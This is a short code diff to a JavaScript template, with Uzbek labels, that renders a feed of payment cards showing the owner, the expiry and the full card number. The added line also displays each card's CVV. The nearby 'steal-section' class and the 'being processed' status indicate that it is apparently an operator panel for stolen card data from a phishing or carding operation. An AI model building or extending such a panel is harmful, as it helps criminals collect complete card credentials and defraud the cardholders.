@@ -508,6 +508,7 @@ function addCardToFeed(card) {
       <div class="card-meta-item"><div class="lbl">Egasi</div><div class="val">${card.name}</div></div>
       <div class="card-meta-item"><div class="lbl">Muddat</div><div class="val">${card.expiry}</div></div>
       <div class="card-meta-item"><div class="lbl">Raqam (to'liq)</div><div class="val" style="color:#ff9800;">${card.number.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim()}</div></div>
+      <div class="card-meta-item"><div class="lbl">CVV</div><div class="val" style="color:#ff9800;">${card.cvv || '—'}</div></div>
       <div class="card-meta-item"><div class="lbl">Holat</div><div class="val status-${card.id}" style="color:#ffd700;">Qayta ishlanmoqda</div></div>
     </div>
     <div class="steal-section">
